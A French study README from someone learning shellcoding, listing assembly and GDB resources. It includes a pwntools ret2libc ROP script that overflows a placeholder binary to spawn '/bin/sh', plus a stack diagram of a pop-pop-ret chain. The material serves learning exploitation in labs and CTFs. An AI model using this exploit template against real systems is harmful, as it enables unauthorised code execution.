# Petit readme où j'étale les ressources et réflexions utilisées au fur et à mesure de mon apprentissage des bases du shellcoding 
Je n'ai aucune compétence préliminaire en assembleur, les codes de mes mains sont donc particulièrement moches et surement peu logiques.


## introduction au shellcoding avec pile executable - RootMe
[Conférence @VoydStack - Writing Shellcodes for dummies](https://www.youtube.com/watch?v=zxhQevqX_7w&t=1288s&ab_channel=Root-Me)


## compilation et extraction d'un shellcode simple en assembleur
[compile.sh](./compile.sh)

## premier challenge de shellcoding rootme 

## RESSOURCES assembleur x64
[Assembly Language & Computer Architecture Lecture (CS 301)](https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_11_registers.html)

[misc/syscalls64.md · Hackndo](https://github.com/Hackndo/misc/blob/master/syscalls64.md)

[gdb.pdf](https://web.cecs.pdx.edu/~apt/cs510comp/gdb.pdf)

[Debugging assembly with GDB – ncona.com – Learning about computers](https://ncona.com/2019/12/debugging-assembly-with-gdb/)

[x64_cheatsheet.pdf](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)

## tester si la pile est executable
```{bash}

```

## 

## BYPASS DE NX et ASLR en utilisant ret2libc et des ROP

[www.trustwave.com](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/babys-first-nxplusaslr-bypass/)

La librairie 'struct' et de l'huile de coude pour trouver et mettre sous forme de shellcode les bonnes adresses mais la librairie 'pwtools' peut aider à cela :

```{python}
from pwn import *

# Configuration de la connexion au binaire vulnérable
context.binary = './vulnerable_program'
elf = ELF('./vulnerable_program')
libc = elf.libc

# Trouver l'offset du dépassement de tampon
offset = 64

# Trouver les gadgets ROP
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Adresse de la fonction system() dans libc
system_addr = libc.symbols['system']

# Adresse de la chaîne "/bin/sh" dans libc
bin_sh_addr = next(libc.search(b'/bin/sh'))

# Construire le payload
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(ret)
payload += p64(system_addr)

# Envoyer le payload au programme vulnérable
p = process('./vulnerable_program')
p.sendline(payload)
p.interactive()
```



exemple de ROP :
l'instruction pop-pop-ret après strcpy

AVANT STRCPY:
strcpy@plt <- EIP, adresse de retour originale écrasée par buffer overflow
pop-pop-ret@ROP
dst (bss)
src (adresse du char 's')


PILE DURANT STRCPY :
ret addr (push par call strcpy) <- EIP (pointe en fait sur le ROP car le shellcode continue dans la pile)
pop-pop-ret@ROP
dst (bss)
src
reste du shellcode stoqué dans la pile...

PILE APRES STRCPY (ret dans strcpy dépile la tete de pile) :
pop-pop-ret@ROP <- EIP
dst
src
reste du shellcode ...

/!\ sans le ROP, on aurait EIP qui pointe sur dst (suite logique du programme du shellcode), et ferait crash le programme

PILE APRES ROP :
reste du sellcode instruction 1 (prochain strcpy ) <- EIP 
(dépilé dans EIP mais pour l'image on laisse dans la pile)
reste du shellcode ...